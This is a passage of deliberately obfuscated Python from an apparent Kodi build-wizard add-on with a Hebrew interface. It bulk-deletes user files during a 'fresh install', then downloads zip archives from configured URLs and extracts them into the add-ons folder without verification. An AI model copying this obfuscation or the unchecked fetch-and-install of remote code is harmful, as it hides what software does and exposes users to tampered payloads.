				elif OOO0000O0000O0000 =='b-yldym-b.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4719
				elif OOO0000O0000O0000 =='x1114.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4720
				elif OOO0000O0000O0000 =='b-mvzyqh-b.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4721
				elif OOO0000O0000O0000 =='mainmenu.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4722
				elif OOO0000O0000O0000 =='skin.Premium.mod.properties'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4723
				elif OOO0000O0000O0000 =='x1122.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4725
				elif OOO0000O0000O0000 =='b-spvrt-b.DATA.xml'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4726
				elif OOO0000O0000O0000 =='favourites.xml'and OOOO0000OOO0O0000 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4731
				elif OOO0000O0000O0000 =='guisettings.xml'and OOOO0000OOO0O0000 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4733
				elif OOO0000O0000O0000 =='profiles.xml'and OOOO0000OOO0O0000 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4734
				elif OOO0000O0000O0000 =='advancedsettings.xml'and OOOO0000OOO0O0000 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4735
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4736
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'program.apollo'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4737
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4738
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'plugin.video.elementum'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4741
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4742
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4743
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'weather.yahoo'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4744
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'plugin.video.quasar'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4745
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'program.apollo'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4746
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4747
				elif OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -2 ]=='userdata'and OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOOO0000OOO0O0000 [OO0OOOO0OO0OO00OO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4748
				elif OOO0000O0000O0000 in LOGFILES :wiz .log ("Keep Log File: %s"%OOO0000O0000O0000 ,xbmc .LOGNOTICE )#line:4749
				elif OOO0000O0000O0000 .endswith ('.db'):#line:4750
					try :#line:4751
						if OOO0000O0000O0000 ==OO0OO00000000OO00 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOO0000O0000O0000 ,KODIV ),xbmc .LOGNOTICE )#line:4752
						else :os .remove (os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ))#line:4753
					except Exception as O00OO0OOOOOO0O0O0 :#line:4754
						if not OOO0000O0000O0000 .startswith ('Textures13'):#line:4755
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4756
							wiz .log ("-> %s"%(str (O00OO0OOOOOO0O0O0 )),xbmc .LOGNOTICE )#line:4757
							wiz .purgeDb (os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ))#line:4758
				else :#line:4759
					DP .update (int (wiz .percentage (OO0O000OO000O00OO ,O000O0OO00OO00O0O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0000O0000O0000 ),'')#line:4760
					try :os .remove (os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ))#line:4761
					except Exception as O00OO0OOOOOO0O0O0 :#line:4762
						wiz .log ("Error removing %s"%os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),xbmc .LOGNOTICE )#line:4763
						wiz .log ("-> / %s"%(str (O00OO0OOOOOO0O0O0 )),xbmc .LOGNOTICE )#line:4764
			if DP .iscanceled ():#line:4765
				DP .close ()#line:4766
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4767
				return False #line:4768
		for O0OOOOOOOO0000OO0 ,O0000O00O00O00OOO ,O0OO000000O00O0O0 in os .walk (OOOOOO0O0O00O0000 ,topdown =True ):#line:4769
			O0000O00O00O00OOO [:]=[O0000OOO0OO00O00O for O0000OOO0OO00O00O in O0000O00O00O00OOO if O0000OOO0OO00O00O not in EXCLUDES ]#line:4770
			for OOO0000O0000O0000 in O0000O00O00O00OOO :#line:4771
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0000O0000O0000 ),'')#line:4772
			  if OOO0000O0000O0000 not in ["Database","userdata","temp","addons","addon_data"]:#line:4773
			   if not (OOO0000O0000O0000 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4774
			    if not (OOO0000O0000O0000 =='skin.titan'and KEEPSKIN3 =='true'):#line:4776
			      if not (OOO0000O0000O0000 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4777
			       if not (OOO0000O0000O0000 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4778
			        if not (OOO0000O0000O0000 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4779
			         if not (OOO0000O0000O0000 =='program.apollo'and KEEPINFO =='true'):#line:4780
			          if not (OOO0000O0000O0000 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4781
			           if not (OOO0000O0000O0000 =='weather.yahoo'and KEEPWEATHER =='true'):#line:4782
			            if not (OOO0000O0000O0000 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4783
			             if not (OOO0000O0000O0000 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4784
			              if not (OOO0000O0000O0000 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4785
			               if not (OOO0000O0000O0000 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4786
			                if not (OOO0000O0000O0000 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4787
			                 if not (OOO0000O0000O0000 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4788
			                  if not (OOO0000O0000O0000 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4789
			                   if not (OOO0000O0000O0000 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4790
			                    if not (OOO0000O0000O0000 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4791
			                     if not (OOO0000O0000O0000 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4792
			                       if not (OOO0000O0000O0000 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4794
			                           if not (OOO0000O0000O0000 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4798
			                            if not (OOO0000O0000O0000 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4799
			                             if not (OOO0000O0000O0000 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4800
			                              if not (OOO0000O0000O0000 =='plugin.video.quasar'and KEEPINFO =='true'):#line:4801
			                               if not (OOO0000O0000O0000 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4802
			                                  shutil .rmtree (os .path .join (O0OOOOOOOO0000OO0 ,OOO0000O0000O0000 ),ignore_errors =True ,onerror =None )#line:4804
			if DP .iscanceled ():#line:4805
				DP .close ()#line:4806
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4807
				return False #line:4808
		DP .close ()#line:4809
		wiz .clearS ('build')#line:4810
		if over ==True :#line:4811
			return True #line:4812
		elif install =='restore':#line:4813
			return True #line:4814
		elif install :#line:4815
			buildWizard (install ,'normal',over =True )#line:4816
		else :#line:4817
			if INSTALLMETHOD ==1 :O000O0OO0OOO0000O =1 #line:4818
			elif INSTALLMETHOD ==2 :O000O0OO0OOO0000O =0 #line:4819
			else :O000O0OO0OOO0000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4820
			if O000O0OO0OOO0000O ==1 :wiz .reloadFix ('fresh')#line:4821
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4822
	else :#line:4823
		if not install =='restore':#line:4824
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4825
			wiz .refresh ()#line:4826
def clearCache ():#line:4831
		wiz .clearCache ()#line:4832
def fixwizard ():#line:4836
		wiz .fixwizard ()#line:4837
def totalClean ():#line:4839
		wiz .clearCache ()#line:4841
		wiz .clearPackages ('total')#line:4842
		clearThumb ('total')#line:4843
		cleanfornewbuild ()#line:4844
def cleanfornewbuild ():#line:4845
		try :#line:4846
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4847
		except :#line:4848
			pass #line:4849
		try :#line:4850
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4851
		except :#line:4852
			pass #line:4853
		try :#line:4854
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4855
		except :#line:4856
			pass #line:4857
def clearThumb (type =None ):#line:4858
	OO00OO0OOOO00O00O =wiz .latestDB ('Textures')#line:4859
	if not type ==None :O00O0O000OOO0OO0O =1 #line:4860
	else :O00O0O000OOO0OO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00OO0OOOO00O00O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4861
	if O00O0O000OOO0OO0O ==1 :#line:4862
		try :wiz .removeFile (os .join (DATABASE ,OO00OO0OOOO00O00O ))#line:4863
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00OO0OOOO00O00O )#line:4864
		wiz .removeFolder (THUMBS )#line:4865
	else :wiz .log ('Clear thumbnames cancelled')#line:4867
	wiz .redoThumbs ()#line:4868
def purgeDb ():#line:4870
	O00OO0OO00O00O000 =[];O0OO0OO0000000OOO =[]#line:4871
	for OOO00OO00OO0000OO ,OOOOOO0O0OOO00OO0 ,O00000OO00OO00000 in os .walk (HOME ):#line:4872
		for OO0OO0OOOO0O00000 in fnmatch .filter (O00000OO00OO00000 ,'*.db'):#line:4873
			if OO0OO0OOOO0O00000 !='Thumbs.db':#line:4874
				OOOO00O00OO0OOOOO =os .path .join (OOO00OO00OO0000OO ,OO0OO0OOOO0O00000 )#line:4875
				O00OO0OO00O00O000 .append (OOOO00O00OO0OOOOO )#line:4876
				O0OO0000O000O00O0 =OOOO00O00OO0OOOOO .replace ('\\','/').split ('/')#line:4877
				O0OO0OO0000000OOO .append ('(%s) %s'%(O0OO0000O000O00O0 [len (O0OO0000O000O00O0 )-2 ],O0OO0000O000O00O0 [len (O0OO0000O000O00O0 )-1 ]))#line:4878
	if KODIV >=16 :#line:4879
		OOOO0O00O0O00000O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0OO0000000OOO )#line:4880
		if OOOO0O00O0O00000O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4881
		elif len (OOOO0O00O0O00000O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4882
		else :#line:4883
			for O00000000O0OO0000 in OOOO0O00O0O00000O :wiz .purgeDb (O00OO0OO00O00O000 [O00000000O0OO0000 ])#line:4884
	else :#line:4885
		OOOO0O00O0O00000O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0OO0OO0000000OOO )#line:4886
		if OOOO0O00O0O00000O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4887
		else :wiz .purgeDb (O00OO0OO00O00O000 [O00000000O0OO0000 ])#line:4888
def fastupdatefirstbuild (O00OOOO00O000O000 ):#line:4894
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:4896
	if ENABLE =='Yes':#line:4897
		if not NOTIFY =='true':#line:4898
			OOOOOOO000O0O00OO =wiz .workingURL (NOTIFICATION )#line:4899
			if OOOOOOO000O0O00OO ==True :#line:4900
				O000OO0OOOO00O00O ,O00O0O0O0000O000O =wiz .splitNotify (NOTIFICATION )#line:4901
				if not O000OO0OOOO00O00O ==False :#line:4903
					try :#line:4904
						O000OO0OOOO00O00O =int (O000OO0OOOO00O00O );O00OOOO00O000O000 =int (O00OOOO00O000O000 )#line:4905
						checkidupdate ()#line:4906
						wiz .setS ("notedismiss","true")#line:4907
						if O000OO0OOOO00O00O ==O00OOOO00O000O000 :#line:4908
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O000OO0OOOO00O00O ),xbmc .LOGNOTICE )#line:4909
						elif O000OO0OOOO00O00O >O00OOOO00O000O000 :#line:4911
							wiz .log ("[Notifications] id: %s"%str (O000OO0OOOO00O00O ),xbmc .LOGNOTICE )#line:4912
							wiz .setS ('noteid',str (O000OO0OOOO00O00O ))#line:4913
							wiz .setS ("notedismiss","true")#line:4914
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4917
					except Exception as O0O0O00OOOOOO00O0 :#line:4918
						wiz .log ("Error on Notifications Window: %s"%str (O0O0O00OOOOOO00O0 ),xbmc .LOGERROR )#line:4919
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4921
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOOOOOO000O0O00OO ),xbmc .LOGNOTICE )#line:4922
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4923
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4924
def checkidupdate ():#line:4930
				wiz .setS ("notedismiss","true")#line:4932
				O00O0O0O0O0OOOO0O =wiz .workingURL (NOTIFICATION )#line:4933
				O00O0OO000OO0000O =" Kodi Premium"#line:4935
				O0000O0OO00OO0OOO =wiz .checkBuild (O00O0OO000OO0000O ,'gui')#line:4936
				OOOO0O00O00OOO000 =O00O0OO000OO0000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4937
				if not wiz .workingURL (O0000O0OO00OO0OOO )==True :return #line:4938
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4939
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00O0OO000OO0000O ),'','אנא המתן')#line:4940
				O000O0OO000O0O00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOO0O00O00OOO000 )#line:4941
				try :os .remove (O000O0OO000O0O00O )#line:4942
				except :pass #line:4943
				logging .warning (O0000O0OO00OO0OOO )#line:4944
				if 'google'in O0000O0OO00OO0OOO :#line:4945
				   O0000O0OO0OOOO0O0 =googledrive_download (O0000O0OO00OO0OOO ,O000O0OO000O0O00O ,DP ,wiz .checkBuild (O00O0OO000OO0000O ,'filesize'))#line:4946
				else :#line:4949
				  downloader .download (O0000O0OO00OO0OOO ,O000O0OO000O0O00O ,DP )#line:4950
				xbmc .sleep (100 )#line:4951
				O0OO0OO000O0O0OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O0OO000OO0000O )#line:4952
				DP .update (0 ,O0OO0OO000O0O0OO0 ,'','אנא המתן')#line:4953
				extract .all (O000O0OO000O0O00O ,HOME ,DP ,title =O0OO0OO000O0O0OO0 )#line:4954
				DP .close ()#line:4955
				wiz .defaultSkin ()#line:4956
				wiz .lookandFeelData ('save')#line:4957
				if KODIV >=18 :#line:4958
					skindialogsettind18 ()#line:4959
				wiz .kodi17Fix ()#line:4960
				if INSTALLMETHOD ==1 :O0OO0OOO0OOO0O0O0 =1 #line:4962
				elif INSTALLMETHOD ==2 :O0OO0OOO0OOO0O0O0 =0 #line:4963
				else :DP .close ()#line:4964
def gaiaserenaddon ():#line:4966
  O0O0OOOOOO0OO0OOO =(ADDON .getSetting ("gaiaseren"))#line:4967
  OOOO0OOOOO00O0OO0 =(ADDON .getSetting ("rdbuild"))#line:4968
  if O0O0OOOOOO0OO0OOO =='true'and OOOO0OOOOO00O0OO0 =='true':#line:4969
    O0OOO0O0OO0O0O0O0 =(NEWFASTUPDATE )#line:4970
    O000O0OO00O00OOOO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4971
    O00OO0O000O0O0OO0 =xbmcgui .DialogProgress ()#line:4972
    O00OO0O000O0O0OO0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4973
    O00000OOO00O0O0O0 =os .path .join (PACKAGES ,'isr.zip')#line:4974
    O0OO0O0OO00OOOOO0 =urllib2 .Request (O0OOO0O0OO0O0O0O0 )#line:4975
    OOOOOO000OOOOO0OO =urllib2 .urlopen (O0OO0O0OO00OOOOO0 )#line:4976
    OOO0OO00O0OOOO00O =xbmcgui .DialogProgress ()#line:4978
    OOO0OO00O0OOOO00O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4979
    OOO0OO00O0OOOO00O .update (0 )#line:4980
    O0OO0O0O0O0000OOO =open (O00000OOO00O0O0O0 ,'wb')#line:4982
    try :#line:4984
      OOOOO00OOOO000O00 =OOOOOO000OOOOO0OO .info ().getheader ('Content-Length').strip ()#line:4985
      OO0000OO00O0OO00O =True #line:4986
    except AttributeError :#line:4987
          OO0000OO00O0OO00O =False #line:4988
    if OO0000OO00O0OO00O :#line:4990
          OOOOO00OOOO000O00 =int (OOOOO00OOOO000O00 )#line:4991
    O0OO00OOOO0OO0O00 =0 #line:4993
    OO00O000OOO0OOOOO =time .time ()#line:4994
    while True :#line:4995
          O00O0OOOOO00O000O =OOOOOO000OOOOO0OO .read (8192 )#line:4996
          if not O00O0OOOOO00O000O :#line:4997
              sys .stdout .write ('\n')#line:4998
              break #line:4999
          O0OO00OOOO0OO0O00 +=len (O00O0OOOOO00O000O )#line:5001
          O0OO0O0O0O0000OOO .write (O00O0OOOOO00O000O )#line:5002
          if not OO0000OO00O0OO00O :#line:5004
              OOOOO00OOOO000O00 =O0OO00OOOO0OO0O00 #line:5005
          if OOO0OO00O0OOOO00O .iscanceled ():#line:5006
             OOO0OO00O0OOOO00O .close ()#line:5007
             try :#line:5008
              os .remove (O00000OOO00O0O0O0 )#line:5009
             except :#line:5010
              pass #line:5011
             break #line:5012
          OO0O00O0O0O0OO00O =float (O0OO00OOOO0OO0O00 )/OOOOO00OOOO000O00 #line:5013
          OO0O00O0O0O0OO00O =round (OO0O00O0O0O0OO00O *100 ,2 )#line:5014
          OOOO00OOO0OOO00O0 =O0OO00OOOO0OO0O00 /(1024 *1024 )#line:5015
          OO00O00OOO00O0OOO =OOOOO00OOOO000O00 /(1024 *1024 )#line:5016
          O00O00OOOO00O0OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOO00OOO0OOO00O0 ,'teal',OO00O00OOO00O0OOO )#line:5017
          if (time .time ()-OO00O000OOO0OOOOO )>0 :#line:5018
            OO000O00OOO0000OO =O0OO00OOOO0OO0O00 /(time .time ()-OO00O000OOO0OOOOO )#line:5019
            OO000O00OOO0000OO =OO000O00OOO0000OO /1024 #line:5020
          else :#line:5021
           OO000O00OOO0000OO =0 #line:5022
          O0O0OOOO00OO0OOO0 ='KB'#line:5023
          if OO000O00OOO0000OO >=1024 :#line:5024
             OO000O00OOO0000OO =OO000O00OOO0000OO /1024 #line:5025
             O0O0OOOO00OO0OOO0 ='MB'#line:5026
          if OO000O00OOO0000OO >0 and not OO0O00O0O0O0OO00O ==100 :#line:5027
              OO00O0OOO00OO0OO0 =(OOOOO00OOOO000O00 -O0OO00OOOO0OO0O00 )/OO000O00OOO0000OO #line:5028
          else :#line:5029
              OO00O0OOO00OO0OO0 =0 #line:5030
          OOOO0O0OOOOOOO000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000O00OOO0000OO ,O0O0OOOO00OO0OOO0 )#line:5031
          OOO0OO00O0OOOO00O .update (int (OO0O00O0O0O0OO00O ),O00O00OOOO00O0OO0 ,OOOO0O0OOOOOOO000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5033
    O0OO00O00O0OOOOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5036
    O0OO0O0O0O0000OOO .close ()#line:5039
    extract .all (O00000OOO00O0O0O0 ,O0OO00O00O0OOOOOO ,OOO0OO00O0OOOO00O )#line:5040
    try :#line:5044
      os .remove (O00000OOO00O0O0O0 )#line:5045
    except :#line:5046
      pass #line:5047
def testnotify ():#line:5049
	O0O0OO0OO0OOO0OO0 =wiz .workingURL (NOTIFICATION )#line:5050
	if O0O0OO0OO0OOO0OO0 ==True :#line:5051
		try :#line:5052
			O0OOOOO0000OO0OO0 ,O00000OOO00OO000O =wiz .splitNotify (NOTIFICATION )#line:5053
